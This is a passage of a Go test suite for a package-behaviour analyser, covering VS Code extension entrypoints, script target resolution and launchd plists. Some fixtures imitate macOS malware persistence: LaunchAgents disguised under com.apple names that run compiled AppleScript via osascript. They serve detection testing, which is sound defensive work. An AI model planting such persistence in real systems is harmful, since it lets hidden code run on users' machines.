func TestVSCodeMissingEntrypointsRetainDeclarationsAndDeduplicateCoverage(t *testing.T) {
	var graph behavior.Graph
	contents := []artifact.Content{{
		NodeID:      "node-package",
		LogicalPath: "extension/package.json",
		Data:        []byte(`{"main":"dist/missing.js","browser":"dist/web.js","engines":{"vscode":"*"}}`),
	}}

	ResolveVSCodeExtensionEntrypoints(&graph, contents)

	if len(graph.Features) != 2 || len(graph.Evidence) != 2 || len(graph.ExecutionRoots) != 0 || len(graph.InvokedTargets) != 0 {
		t.Fatalf("missing targets lost declarations or created execution records: features=%#v evidence=%#v roots=%#v targets=%#v", graph.Features, graph.Evidence, graph.ExecutionRoots, graph.InvokedTargets)
	}
	if countCoverageDetail(graph.Coverage, "vscode-entrypoint-resolution", vscodeEntrypointMissingCoverage) != 1 {
		t.Fatalf("identical missing-target coverage was not deduplicated: %#v", graph.Coverage)
	}
}

func TestVSCodeDuplicateLogicalEntrypointFailsClosed(t *testing.T) {
	var graph behavior.Graph
	contents := []artifact.Content{
		{NodeID: "node-package", LogicalPath: "extension/package.json", Data: []byte(`{"main":"main.js","engines":{"vscode":"*"}}`)},
		{NodeID: "node-a", LogicalPath: "extension/main.js"},
		{NodeID: "node-b", LogicalPath: "extension/main.js"},
	}

	ResolveVSCodeExtensionEntrypoints(&graph, contents)

	if len(graph.ExecutionRoots) != 0 || countCoverageDetail(graph.Coverage, "vscode-entrypoint-resolution", vscodeEntrypointAmbiguousCoverage) != 1 {
		t.Fatalf("duplicate logical target did not fail closed: roots=%#v coverage=%#v", graph.ExecutionRoots, graph.Coverage)
	}
}

func TestVSCodeBrowserTargetDoesNotBecomeLocalExecution(t *testing.T) {
	graph := behavior.Graph{Operations: []behavior.ModeledOperation{{
		SubjectNodeID: "node-browser",
		Kind:          behavior.OperationProcessExecute,
		Execution:     unknownExecutionContext(),
	}}}
	contents := []artifact.Content{
		{NodeID: "node-package", LogicalPath: "extension/package.json", Data: []byte(`{"browser":"dist/web.js","engines":{"vscode":"*"}}`)},
		{NodeID: "node-browser", LogicalPath: "extension/dist/web.js"},
	}

	ResolveVSCodeExtensionEntrypoints(&graph, contents)

	if len(graph.ExecutionRoots) != 0 || len(graph.InvokedTargets) != 1 ||
		graph.InvokedTargets[0].Kind != "vscode-extension-browser" ||
		graph.InvokedTargets[0].Execution.Connectivity != behavior.ConnectivityUnknown {
		t.Fatalf("browser runtime was presented as a local root or lost its target: roots=%#v targets=%#v", graph.ExecutionRoots, graph.InvokedTargets)
	}
	if graph.Operations[0].Execution.Connectivity != behavior.ConnectivityUnknown {
		t.Fatalf("browser target promoted a local process operation: %#v", graph.Operations[0])
	}
	if !hasPartialCoverageScope(graph.Coverage, "vscode-browser-runtime") {
		t.Fatalf("browser runtime limitation was silent: %#v", graph.Coverage)
	}
}

func TestVSCodeExtensionlessBrowserResolutionRemainsPartial(t *testing.T) {
	var graph behavior.Graph
	contents := []artifact.Content{
		{NodeID: "node-package", LogicalPath: "extension/package.json", Data: []byte(`{"browser":"dist/web","engines":{"vscode":"*"}}`)},
		{NodeID: "node-browser", LogicalPath: "extension/dist/web.js"},
	}

	ResolveVSCodeExtensionEntrypoints(&graph, contents)

	if len(graph.Features) != 1 || len(graph.ExecutionRoots) != 0 || len(graph.InvokedTargets) != 0 {
		t.Fatalf("extensionless browser declaration gained unsupported resolution: features=%#v roots=%#v targets=%#v", graph.Features, graph.ExecutionRoots, graph.InvokedTargets)
	}
	if countCoverageDetail(graph.Coverage, "vscode-entrypoint-resolution", vscodeBrowserEntrypointExtensionlessCoverage) != 1 {
		t.Fatalf("extensionless browser limitation was silent: %#v", graph.Coverage)
	}
}

func TestVSCodeSharedMainBrowserTargetUsesOnlyMainRoot(t *testing.T) {
	graph := behavior.Graph{Operations: []behavior.ModeledOperation{{
		SubjectNodeID: "node-shared",
		Kind:          behavior.OperationProcessExecute,
		Execution:     unknownExecutionContext(),
	}}}
	contents := []artifact.Content{
		{NodeID: "node-package", LogicalPath: "extension/package.json", Data: []byte(`{"main":"dist/shared.js","browser":"dist/shared.js","engines":{"vscode":"*"}}`)},
		{NodeID: "node-shared", LogicalPath: "extension/dist/shared.js"},
	}

	ResolveVSCodeExtensionEntrypoints(&graph, contents)

	if len(graph.ExecutionRoots) != 1 || graph.ExecutionRoots[0].Kind != "vscode-extension-main" || len(graph.InvokedTargets) != 1 {
		t.Fatalf("shared entrypoint did not preserve distinct Node and browser declarations: roots=%#v targets=%#v", graph.ExecutionRoots, graph.InvokedTargets)
	}
	if graph.Operations[0].Execution.Connectivity != behavior.ConnectivityConnected ||
		len(graph.Operations[0].Execution.ExecutionRootIDs) != 1 ||
		graph.Operations[0].Execution.ExecutionRootIDs[0] != graph.ExecutionRoots[0].ID {
		t.Fatalf("shared target gained ownership other than the local main root: %#v", graph.Operations[0])
	}
}

func TestVSCodeActivationEventsRemainDirectUnconnectedFeatures(t *testing.T) {
	var graph behavior.Graph
	contents := []artifact.Content{
		{
			NodeID:      "node-package",
			ScopeID:     "scope-package",
			LogicalPath: "sample.vsix!extension/package.json",
			Data: []byte(`{
				"name":"sample-extension",
				"main":"main.js",
				"activationEvents":["onUri","onStartupFinished","onUri"]
			}`),
		},
		{NodeID: "node-main", ScopeID: "scope-main", LogicalPath: "sample.vsix!extension/main.js"},
	}

	ResolveVSCodeExtensionEntrypoints(&graph, contents)

	features := vscodeActivationEventFeatures(graph)
	if len(features) != 2 {
		t.Fatalf("activation-event features = %#v, want two sorted unique declarations", features)
	}
	for index, want := range []string{"onStartupFinished", "onUri"} {
		feature := features[index]
		if feature.NodeID != "node-package" || feature.ScopeID != "scope-package" ||
			feature.Value != want || feature.Support != behavior.SupportDirect ||
			feature.Execution.Connectivity != behavior.ConnectivityUnknown ||
			len(feature.Execution.ExecutionRootIDs) != 0 ||
			len(feature.EvidenceIDs) != 1 {
			t.Fatalf("activation-event feature %d = %#v", index, feature)
		}
		evidence := packageHookEvidenceByID(t, graph, feature.EvidenceIDs[0])
		if evidence.NodeID != "node-package" ||
			evidence.Kind != "vscode-extension-activation-event-declaration" ||
			evidence.Method != "vscode-extension-package" ||
			evidence.Value != "activationEvents: "+want {
			t.Fatalf("activation-event evidence %d = %#v", index, evidence)
		}
	}
	if len(graph.ExecutionRoots) != 1 || graph.ExecutionRoots[0].StartNodeID != "node-main" {
		t.Fatalf("activation metadata changed main-root resolution: %#v", graph.ExecutionRoots)
	}
}

func TestVSCodeActivationEventsFailPartiallyWithoutPoisoningMain(t *testing.T) {
	for _, test := range []struct {
		name            string
		activationField string
		wantValues      []string
		wantPartial     bool
	}{
		{
			name:            "wrong type",
			activationField: `"activationEvents":{"onStartupFinished":true}`,
			wantPartial:     true,
		},
		{
			name:            "null",
			activationField: `"activationEvents":null`,
			wantPartial:     true,
		},
		{
			name:            "mixed array",
			activationField: `"activationEvents":["onStartupFinished",7]`,
			wantValues:      []string{"onStartupFinished"},
			wantPartial:     true,
		},
		{
			name:            "oversized value",
			activationField: fmt.Sprintf(`"activationEvents":[%q]`, strings.Repeat("x", maxVSCodeActivationEventBytes+1)),
			wantPartial:     true,
		},
		{
			name:            "wrong key casing",
			activationField: `"activationevents":["onStartupFinished"]`,
		},
	} {
		t.Run(test.name, func(t *testing.T) {
			var graph behavior.Graph
			contents := []artifact.Content{
				{
					NodeID:      "node-package",
					LogicalPath: "sample.vsix!extension/package.json",
					Data:        []byte(`{"main":"main.js",` + test.activationField + `}`),
				},
				{NodeID: "node-main", LogicalPath: "sample.vsix!extension/main.js"},
			}

			ResolveVSCodeExtensionEntrypoints(&graph, contents)

			features := vscodeActivationEventFeatures(graph)
			if len(features) != len(test.wantValues) {
				t.Fatalf("activation-event features = %#v, want %q", features, test.wantValues)
			}
			for index, want := range test.wantValues {
				if features[index].Value != want {
					t.Fatalf("activation-event feature %d = %#v, want %q", index, features[index], want)
				}
			}
			if got := hasPartialCoverageScope(graph.Coverage, "vscode-activation-events"); got != test.wantPartial {
				t.Fatalf("partial coverage = %t, want %t: %#v", got, test.wantPartial, graph.Coverage)
			}
			if len(graph.ExecutionRoots) != 1 || graph.ExecutionRoots[0].StartNodeID != "node-main" {
				t.Fatalf("optional activation metadata poisoned main resolution: %#v", graph.ExecutionRoots)
			}
		})
	}
}

func TestVSCodeActivationEventsAreCardinalityBounded(t *testing.T) {
	encoded := make([]string, maxVSCodeActivationEvents+1)
	for index := range encoded {
		encoded[index] = fmt.Sprintf("%q", fmt.Sprintf("onCommand:command-%04d", index))
	}
	var graph behavior.Graph
	contents := []artifact.Content{
		{
			NodeID:      "node-package",
			LogicalPath: "sample.vsix!extension/package.json",
			Data: []byte(
				`{"main":"main.js","activationEvents":[` +
					strings.Join(encoded, ",") +
					`]}`,
			),
		},
		{NodeID: "node-main", LogicalPath: "sample.vsix!extension/main.js"},
	}

	ResolveVSCodeExtensionEntrypoints(&graph, contents)

	features := vscodeActivationEventFeatures(graph)
	if len(features) != maxVSCodeActivationEvents {
		t.Fatalf("activation-event features = %d, want %d", len(features), maxVSCodeActivationEvents)
	}
	if features[0].Value != "onCommand:command-0000" ||
		features[len(features)-1].Value != "onCommand:command-0255" {
		t.Fatalf("bounded activation-event range = %q ... %q", features[0].Value, features[len(features)-1].Value)
	}
	if !hasPartialCoverageScope(graph.Coverage, "vscode-activation-events") {
		t.Fatalf("activation-event cardinality limit was silent: %#v", graph.Coverage)
	}
	if len(graph.ExecutionRoots) != 1 {
		t.Fatalf("bounded activation metadata suppressed the main root: %#v", graph.ExecutionRoots)
	}
}

func TestVSCodeActivationEventsCannotStarveMainRoot(t *testing.T) {
	graph := behavior.Graph{EvidenceLimit: 3}
	contents := []artifact.Content{
		{
			NodeID:      "node-package",
			LogicalPath: "sample.vsix!extension/package.json",
			Data:        []byte(`{"main":"main.js","activationEvents":["onStartupFinished","onUri"]}`),
		},
		{NodeID: "node-main", LogicalPath: "sample.vsix!extension/main.js"},
	}

	ResolveVSCodeExtensionEntrypoints(&graph, contents)
	graph.FinalizeLimits()

	if len(graph.ExecutionRoots) != 1 || graph.ExecutionRoots[0].StartNodeID != "node-main" {
		t.Fatalf("activation metadata exhausted evidence before main-root resolution: roots=%#v evidence=%#v coverage=%#v", graph.ExecutionRoots, graph.Evidence, graph.Coverage)
	}
	if graph.EvidenceLimitDrops == 0 {
		t.Fatalf("tight evidence limit did not exercise activation-metadata truncation: %#v", graph.Evidence)
	}
}

func TestVSCodeManifestFeaturesRequireExactExecutionRelationship(t *testing.T) {
	var graph behavior.Graph
	contents := []artifact.Content{
		{
			NodeID:      "node-package",
			LogicalPath: "sample.vsix!extension/package.json",
			Data:        []byte(`{"main":"main.js","activationEvents":["onStartupFinished"]}`),
		},
		{NodeID: "node-main", LogicalPath: "sample.vsix!extension/main.js"},
	}

	ResolveVSCodeExtensionEntrypoints(&graph, contents)
	promoteNodeExecution(
		&graph,
		map[string]behavior.ExecutionContext{
			"node-package": connectedExecutionContext([]string{"root-external"}, nil),
		},
	)

	checked := 0
	for _, feature := range graph.Features {
		if feature.Key != "vscode.extension.entrypoint" &&
			feature.Key != "vscode.extension.activation_event" {
			continue
		}
		checked++
		if feature.Execution.Connectivity != behavior.ConnectivityUnknown ||
			len(feature.Execution.ExecutionRootIDs) != 0 {
			t.Fatalf("manifest declaration inherited node execution: %#v", feature)
		}
	}
	if checked != 2 {
		t.Fatalf("checked %d VS Code manifest features, want entrypoint and activation event: %#v", checked, graph.Features)
	}
}

func TestActivationEventsAloneDoNotIdentifyVSCodeExtension(t *testing.T) {
	var graph behavior.Graph
	contents := []artifact.Content{
		{NodeID: "node-package", LogicalPath: "package.json", Data: []byte(`{"main":"main.js","activationEvents":["onStartupFinished"]}`)},
		{NodeID: "node-main", LogicalPath: "main.js"},
	}

	ResolveVSCodeExtensionEntrypoints(&graph, contents)

	if len(graph.Features) != 0 || len(graph.ExecutionRoots) != 0 || len(graph.InvokedTargets) != 0 {
		t.Fatalf("activationEvents alone misclassified an ordinary package: features=%#v roots=%#v targets=%#v", graph.Features, graph.ExecutionRoots, graph.InvokedTargets)
	}
}

func vscodeActivationEventFeatures(graph behavior.Graph) []behavior.Feature {
	var out []behavior.Feature
	for _, feature := range graph.Features {
		if feature.Key == "vscode.extension.activation_event" {
			out = append(out, feature)
		}
	}
	return out
}

func packageHookEvidenceByID(t *testing.T, graph behavior.Graph, id string) behavior.Evidence {
	t.Helper()
	for _, evidence := range graph.Evidence {
		if evidence.ID == id {
			return evidence
		}
	}
	t.Fatalf("missing evidence %s", id)
	return behavior.Evidence{}
}

func TestResolveVSCodeExtensionEntrypointsIndexesLargePromotionProduct(t *testing.T) {
	const (
		targetCount         = 1500
		operationsPerTarget = 4
	)
	manifest := []byte(`{"main":"main","engines":{"vscode":"*"}}`)
	contents := make([]artifact.Content, 0, 2*targetCount)
	var graph behavior.Graph
	for i := 0; i < targetCount; i++ {
		directory := fmt.Sprintf("extension-%05d", i)
		nodeID := fmt.Sprintf("node-extension-%05d", i)
		contents = append(contents,
			artifact.Content{NodeID: "node-package-" + nodeID, LogicalPath: directory + "/package.json", Data: manifest},
			artifact.Content{NodeID: nodeID, LogicalPath: directory + "/main.js"},
		)
		for j := 0; j < operationsPerTarget; j++ {
			graph.Operations = append(graph.Operations, behavior.ModeledOperation{SubjectNodeID: nodeID, Execution: unknownExecutionContext()})
		}
	}

	ResolveVSCodeExtensionEntrypoints(&graph, contents)

	for i, operation := range graph.Operations {
		if operation.Execution.Connectivity != behavior.ConnectivityConnected || len(operation.Execution.ExecutionRootIDs) != 1 {
			t.Fatalf("operation %d was not promoted from its indexed VS Code target: %#v", i, operation)
		}
	}
	if len(graph.ExecutionRoots) != targetCount || len(graph.Evidence) != 2*targetCount || len(graph.Features) != targetCount {
		t.Fatalf("unexpected derived output sizes: roots=%d evidence=%d features=%d", len(graph.ExecutionRoots), len(graph.Evidence), len(graph.Features))
	}
}

func TestResolveVSCodeExtensionDoesNotPromoteWithoutEvidence(t *testing.T) {
	graph := behavior.Graph{
		StringByteLimit: 1,
		Operations: []behavior.ModeledOperation{{
			SubjectNodeID: "node-extension",
			Execution:     unknownExecutionContext(),
		}},
	}
	contents := []artifact.Content{
		{
			NodeID:      "node-package",
			LogicalPath: "extension/package.json",
			Data:        []byte(`{"main":"dist/extension.js","engines":{"vscode":"*"}}`),
		},
		{NodeID: "node-extension", LogicalPath: "extension/dist/extension.js"},
	}

	ResolveVSCodeExtensionEntrypoints(&graph, contents)
	graph.FinalizeLimits()

	if graph.Operations[0].Execution.Connectivity != behavior.ConnectivityUnknown {
		t.Fatalf("VS Code target was promoted without retained evidence: %#v", graph.Operations[0])
	}
	if len(graph.ExecutionRoots) != 0 || len(graph.Evidence) != 0 {
		t.Fatalf("failed provenance produced roots: evidence=%#v roots=%#v", graph.Evidence, graph.ExecutionRoots)
	}
	if !hasPartialCoverageScope(graph.Coverage, "behavior-ir") {
		t.Fatalf("graph limit was not reported: %#v", graph.Coverage)
	}
}

func TestResolveScriptOperationTargetsPropagatesTransitively(t *testing.T) {
	var graph behavior.Graph
	graph.AddOperation(behavior.ModeledOperation{
		SubjectNodeID: "node-a",
		Kind:          "process.execute", ResourceBindings: behavior.Bindings(behavior.Bind(behavior.ResourceRoleExecutable, behavior.Resource{Kind: behavior.ResourceFile, Value: "/fixture/b.sh"})), Execution: testConnectedExecution("root-a"),
	})
	graph.AddOperation(behavior.ModeledOperation{
		SubjectNodeID: "node-b",
		Kind:          "process.execute", ResourceBindings: behavior.Bindings(behavior.Bind(behavior.ResourceRoleExecutable, behavior.Resource{Kind: behavior.ResourceFile, Value: "/fixture/c.sh"})), Execution: unknownExecutionContext(),
	})
	graph.AddOperation(behavior.ModeledOperation{
		SubjectNodeID: "node-c",
		Kind:          "file.write", ResourceBindings: behavior.Bindings(behavior.Bind(behavior.ResourceRoleLocalOutput, behavior.Resource{Kind: behavior.ResourceFile, Value: "/tmp/result"})), Execution: unknownExecutionContext(),
	})
	contents := []artifact.Content{
		{NodeID: "node-a", LogicalPath: "/fixture/a.sh"},
		{NodeID: "node-b", LogicalPath: "/fixture/b.sh"},
		{NodeID: "node-c", LogicalPath: "/fixture/c.sh"},
	}

	ResolveScriptOperationTargets(&graph, contents, nil)

	for _, index := range []int{1, 2} {
		if graph.Operations[index].Execution.Connectivity != behavior.ConnectivityConnected || len(graph.Operations[index].Execution.ExecutionRootIDs) != 1 || graph.Operations[index].Execution.ExecutionRootIDs[0] != "root-a" || len(graph.Operations[index].Execution.InvokedTargetIDs) == 0 {
			t.Fatalf("transitive target operation %d was not promoted: %#v", index, graph.Operations[index])
		}
	}
	if len(graph.InvokedTargets) != 2 {
		t.Fatalf("expected invoked-target records for both resolved scripts: %#v", graph.InvokedTargets)
	}
}

func TestResolveScriptOperationTargetsReusesExactLifecycleTarget(t *testing.T) {
	var graph behavior.Graph
	rootID := graph.AddExecutionRoot(behavior.ExecutionRoot{
		Kind: "npm-script", DeclarationNodeID: "node-package",
		StartNodeID: "node-package", StartScopeID: "scope-package",
		Name: "preinstall", EvidenceIDs: []string{"ev-root"},
	})
	execution := connectedExecutionContext([]string{rootID}, nil)
	sourceID := graph.AddOperation(behavior.ModeledOperation{
		SubjectNodeID: "node-package", ScopeID: "scope-package-script",
		Kind: behavior.OperationInterpreterInvoke,
		ResourceBindings: behavior.Bindings(
			behavior.Bind(behavior.ResourceRoleArguments, behavior.NewResource(behavior.ResourceCommand, "/fixture/setup.js")),
			behavior.Bind(behavior.ResourceRoleExecutable, behavior.NewResource(behavior.ResourceFile, "node", behavior.ResourceClassInterpreter)),
			behavior.Bind(behavior.ResourceRoleLocalInput, behavior.NewResource(behavior.ResourceFile, "/fixture/setup.js")),
		),
		EvidenceIDs: []string{"ev-root"}, Support: behavior.SupportCorroborated,
		Execution: execution,
	})
	lifecycleTargetID := graph.AddInvokedTarget(behavior.InvokedTarget{
		Kind: "lifecycle-target", NodeID: "node-script", ScopeID: "scope-script",
		Source:    behavior.EntityRef{Kind: behavior.EntityKindExecutionRoot, ID: rootID},
		Execution: execution, Arguments: []string{"setup.js"}, EvidenceIDs: []string{"ev-lifecycle"},
	})
	graph.AddOperation(behavior.ModeledOperation{
		SubjectNodeID: "node-script", ScopeID: "scope-script",
		Kind: behavior.OperationFileWrite,
		ResourceBindings: behavior.Bindings(
			behavior.Bind(behavior.ResourceRoleLocalOutput, behavior.NewResource(behavior.ResourceFile, "/tmp/result")),
		),
		EvidenceIDs: []string{"ev-child"}, Support: behavior.SupportCorroborated,
		Execution: unknownExecutionContext(),
	})
	contents := []artifact.Content{
		{NodeID: "node-package", ScopeID: "scope-package", LogicalPath: "package.json"},
		{NodeID: "node-script", ScopeID: "scope-script", LogicalPath: "/fixture/setup.js"},
	}

	ResolveScriptOperationTargets(&graph, contents, nil)

	if len(graph.InvokedTargets) != 1 || graph.InvokedTargets[0].ID != lifecycleTargetID || graph.InvokedTargets[0].Kind != "lifecycle-target" {
		t.Fatalf("operation resolver duplicated an exact lifecycle target: %#v", graph.InvokedTargets)
	}
	if len(graph.Relations) != 1 || graph.Relations[0].Kind != behavior.RelationInvokes ||
		graph.Relations[0].From.ID != sourceID || graph.Relations[0].To.ID != lifecycleTargetID {
		t.Fatalf("operation did not relate to the reused lifecycle target: %#v", graph.Relations)
	}
	child := graph.Operations[1]
	if child.Execution.Connectivity != behavior.ConnectivityConnected ||
		!slices.Contains(child.Execution.ExecutionRootIDs, rootID) ||
		!slices.Contains(child.Execution.InvokedTargetIDs, lifecycleTargetID) {
		t.Fatalf("reused lifecycle target did not promote child ownership: %#v", child)
	}
}

func TestResolveScriptOperationTargetsRetainsUnknownInvocationWithoutPromotion(t *testing.T) {
	var graph behavior.Graph
	sourceID := graph.AddOperation(behavior.ModeledOperation{
		SubjectNodeID: "node-a",
		Kind:          "process.execute", ResourceBindings: behavior.Bindings(behavior.Bind(behavior.ResourceRoleExecutable, behavior.Resource{Kind: behavior.ResourceFile, Value: "/fixture/b.sh"})), Execution: unknownExecutionContext(),
		EvidenceIDs: []string{"ev-source"}, Support: behavior.SupportCorroborated,
	})
	graph.AddOperation(behavior.ModeledOperation{
		SubjectNodeID: "node-b",
		Kind:          "file.write", ResourceBindings: behavior.Bindings(behavior.Bind(behavior.ResourceRoleLocalOutput, behavior.NewResource(behavior.ResourceFile, "/tmp/output"))),
		EvidenceIDs: []string{"ev-target"}, Support: behavior.SupportCorroborated, Execution: unknownExecutionContext(),
	})
	contents := []artifact.Content{
		{NodeID: "node-a", LogicalPath: "/fixture/a.sh"},
		{NodeID: "node-b", LogicalPath: "/fixture/b.sh"},
	}

	ResolveScriptOperationTargets(&graph, contents, nil)

	if graph.Operations[1].Execution.Connectivity != behavior.ConnectivityUnknown {
		t.Fatalf("target was promoted from an operation with no connected root: %#v", graph.Operations[1])
	}
	if len(graph.InvokedTargets) != 1 || graph.InvokedTargets[0].Execution.Connectivity != behavior.ConnectivityUnknown || graph.InvokedTargets[0].Source.Kind != behavior.EntityKindArtifactNode {
		t.Fatalf("unknown invocation target = %#v", graph.InvokedTargets)
	}
	if len(graph.Relations) != 1 || graph.Relations[0].Kind != behavior.RelationInvokes || graph.Relations[0].From.ID != sourceID || graph.Relations[0].To.ID != graph.InvokedTargets[0].ID || graph.Relations[0].Execution.Connectivity != behavior.ConnectivityUnknown {
		t.Fatalf("unknown invocation relation = %#v", graph.Relations)
	}
}

func TestResolveScriptOperationTargetsRetainsLaunchdCompiledOSAScriptContext(t *testing.T) {
	launchd := artifact.Content{
		NodeID:             "node-launchd",
		LogicalPath:        "sample.pkg!Payload!Library/LaunchAgents/com.apple.FY9.plist",
		PackageInstallPath: "/Library/LaunchAgents/com.apple.FY9.plist",
		Kind:               "plist",
		Data: []byte(`<plist><dict>` +
			`<key>Label</key><string>com.apple.FY9</string>` +
			`<key>ProgramArguments</key><array>` +
			`<string>/usr/bin/osascript</string><string>-l</string><string>AppleScript</string><string>/Library/LaunchAgents/com.apple.4V.plist</string>` +
			`</array></dict></plist>`),
	}
	compiled := artifact.Content{
		NodeID:             "node-compiled-osa",
		LogicalPath:        "sample.pkg!Payload!Library/LaunchAgents/com.apple.4V.plist",
		PackageInstallPath: "/Library/LaunchAgents/com.apple.4V.plist",
		Kind:               "compiled-applescript",
		MediaType:          "application/x-apple-compiled-applescript",
		Data:               []byte("FasdUAS 1.101.10\x00\x04\x0f\xff\xff"),
	}

	var graph behavior.Graph
	ExtractPlist(&graph, launchd, PlistExecutionStart{})
	for _, operation := range graph.Operations {
		if operation.SubjectNodeID == compiled.NodeID {
			t.Fatalf("compiled target unexpectedly had semantic operations before resolution: %#v", graph.Operations)
		}
	}

	ResolveScriptOperationTargets(&graph, []artifact.Content{launchd, compiled}, nil)

	var targets []behavior.InvokedTarget
	for _, target := range graph.InvokedTargets {
		if target.NodeID == compiled.NodeID && target.Kind == "script-target" {
			targets = append(targets, target)
		}
	}
	if len(targets) != 1 {
		t.Fatalf("resolved compiled AppleScript context = %#v, want one invoked target", targets)
	}
	target := targets[0]
	if target.Execution.Connectivity != behavior.ConnectivityConnected || target.Interpreter != "osascript" || len(target.Arguments) != 1 || target.Arguments[0] != compiled.LogicalPath || len(target.EvidenceIDs) != 1 {
		t.Fatalf("compiled AppleScript target context is incomplete: %#v", target)
	}
	if len(graph.Relations) != 1 || graph.Relations[0].Kind != behavior.RelationInvokes || graph.Relations[0].To.ID != target.ID {
		t.Fatalf("compiled AppleScript invocation relation = %#v", graph.Relations)
	}
	for _, evidence := range graph.Evidence {
		if evidence.ID == target.EvidenceIDs[0] {
			if evidence.Kind != "resolved-script-target" || !strings.Contains(evidence.Value, "osascript -l AppleScript /Library/LaunchAgents/com.apple.4V.plist -> /Library/LaunchAgents/com.apple.4V.plist") {
				t.Fatalf("compiled AppleScript relationship evidence is incomplete: %#v", evidence)
			}
			return
		}
	}
	t.Fatalf("compiled AppleScript target evidence %q was not retained: %#v", target.EvidenceIDs[0], graph.Evidence)
}

func TestResolveScriptOperationTargetsRejectsUniqueLaunchdRuntimeBasename(t *testing.T) {
	launchd := artifact.Content{
		NodeID:                        "node-launchd",
		LogicalPath:                   "sample.zip!sample/com.apple.FY9.plist",
		Kind:                          "plist",
		ExecutionRootEligibilityKnown: true,
		ExecutionRootEligible:         false,
		Data: []byte(`<plist><dict>` +
			`<key>Label</key><string>com.apple.FY9</string>` +
			`<key>ProgramArguments</key><array>` +
			`<string>/usr/bin/osascript</string><string>-e</string>` +
			`<string>do shell script "osascript ~/Library/LaunchAgents/com.apple.4V.plist"</string>` +
			`</array></dict></plist>`),
	}
	compiled := artifact.Content{
		NodeID:      "node-compiled-osa",
		LogicalPath: "sample.zip!sample/com.apple.4V.plist",
		Kind:        "compiled-applescript",
		MediaType:   "application/x-apple-compiled-applescript",
	}

	var graph behavior.Graph
	ExtractPlist(&graph, launchd, PlistExecutionStart{})
	ResolveScriptOperationTargets(&graph, []artifact.Content{launchd, compiled}, nil)

	if len(graph.ExecutionRoots) != 0 {
		t.Fatalf("uninstalled launchd declaration became a root: %#v", graph.ExecutionRoots)
	}
	if len(graph.InvokedTargets) != 0 || len(graph.Relations) != 0 {
		t.Fatalf("an archive basename is not evidence of the installed path: targets=%#v relations=%#v", graph.InvokedTargets, graph.Relations)
	}
}

func TestResolveScriptOperationTargetsRejectsAmbiguousLaunchdRuntimeBasename(t *testing.T) {
	var graph behavior.Graph
	graph.AddOperation(behavior.ModeledOperation{
		SubjectNodeID: "node-launchd", Kind: behavior.OperationInterpreterInvoke,
		ResourceBindings: behavior.Bindings(
			behavior.Bind(behavior.ResourceRoleExecutable, behavior.NewResource(behavior.ResourceFile, "osascript", behavior.ResourceClassInterpreter)),
			behavior.Bind(behavior.ResourceRoleArguments, behavior.NewResource(behavior.ResourceCommand, "~/Library/LaunchAgents/com.example.payload.plist")),
		),
		EvidenceIDs: []string{"ev-source"}, Support: behavior.SupportCorroborated, Execution: unknownExecutionContext(),
	})
	contents := []artifact.Content{
		{NodeID: "node-launchd", LogicalPath: "sample.zip!sample/agent.plist", Kind: "plist"},
		{NodeID: "node-a", LogicalPath: "sample.zip!a/com.example.payload.plist", Kind: "compiled-applescript"},
		{NodeID: "node-b", LogicalPath: "sample.zip!b/com.example.payload.plist", Kind: "compiled-applescript"},
	}

	ResolveScriptOperationTargets(&graph, contents, nil)

	if len(graph.InvokedTargets) != 0 || len(graph.Relations) != 0 || len(graph.Evidence) != 0 {
		t.Fatalf("ambiguous runtime basename was resolved: targets=%#v relations=%#v evidence=%#v", graph.InvokedTargets, graph.Relations, graph.Evidence)
	}
}

func TestResolveScriptOperationTargetsBoundsWorkWithPartialCoverage(t *testing.T) {
	var graph behavior.Graph
	graph.AddOperation(behavior.ModeledOperation{
		SubjectNodeID: "node-a",
		Kind:          behavior.OperationInterpreterInvoke,
		ResourceBindings: behavior.Bindings(
			behavior.Bind(behavior.ResourceRoleExecutable, behavior.NewResource(behavior.ResourceFile, "node")),
			behavior.Bind(behavior.ResourceRoleArguments, behavior.NewResource(behavior.ResourceCommand, "--require /fixture/b.sh /fixture/c.sh"))),
		Qualifiers: map[string]string{"argument_encoding": "shell-quoted"}, Execution: testConnectedExecution("root-a"),
	})
	for _, nodeID := range []string{"node-b", "node-c"} {
		graph.AddOperation(behavior.ModeledOperation{
			SubjectNodeID: nodeID,
			Kind:          "file.write", ResourceBindings: behavior.Bindings(behavior.Bind(behavior.ResourceRoleLocalOutput, behavior.Resource{Kind: behavior.ResourceFile, Value: "/tmp/result"})), Execution: unknownExecutionContext(),
		})
	}
	contents := []artifact.Content{
		{NodeID: "node-a", LogicalPath: "/fixture/a.sh"},
		{NodeID: "node-b", LogicalPath: "/fixture/b.sh"},
		{NodeID: "node-c", LogicalPath: "/fixture/c.sh"},
	}

	resolveScriptOperationTargets(&graph, contents, nil, 3)

	if graph.Operations[1].Execution.Connectivity != behavior.ConnectivityConnected {
		t.Fatalf("bounded resolver should retain its deterministic promoted prefix: %#v", graph.Operations)
	}
	if graph.Operations[2].Execution.Connectivity != behavior.ConnectivityUnknown {
		t.Fatalf("resolver exceeded its work budget: %#v", graph.Operations)
	}
	if !hasPartialCoverageScope(graph.Coverage, "script-target-resolution") {
		t.Fatalf("target-resolution truncation must be visible in coverage: %#v", graph.Coverage)
	}
}

func TestResolveScriptOperationTargetsPreservesFixpointConnectivity(t *testing.T) {
	random := rand.New(rand.NewSource(0x4d31))
	for trial := 0; trial < 200; trial++ {
		const nodeCount = 8
		contents := make([]artifact.Content, nodeCount)
		for i := range contents {
			contents[i] = artifact.Content{NodeID: testNodeID(i), LogicalPath: "/fixture/" + testScriptName(i)}
		}
		var graph behavior.Graph
		for i := 0; i < 20; i++ {
			node := random.Intn(nodeCount)
			target := random.Intn(nodeCount)
			execution := unknownExecutionContext()
			if random.Intn(5) == 0 {
				execution = testConnectedExecution("root-seed")
			}
			kind := behavior.OperationProcessExecute
			if random.Intn(4) == 0 {
				kind = behavior.OperationFileWrite
			}
			graph.AddOperation(behavior.ModeledOperation{
				SubjectNodeID: testNodeID(node),
				Kind:          kind,
				ResourceBindings: behavior.Bindings(
					behavior.Bind(behavior.ResourceRoleExecutable, behavior.NewResource(behavior.ResourceFile, "/fixture/"+testScriptName(target))),
				),
				Execution: execution,
			})
		}

		reference := graph
		reference.Operations = append([]behavior.ModeledOperation(nil), graph.Operations...)
		resolveScriptOperationTargetsReference(&reference, contents)
		ResolveScriptOperationTargets(&graph, contents, nil)

		for i := range graph.Operations {
			if graph.Operations[i].Execution.Connectivity != reference.Operations[i].Execution.Connectivity || strings.Join(graph.Operations[i].Execution.ExecutionRootIDs, ",") != strings.Join(reference.Operations[i].Execution.ExecutionRootIDs, ",") {
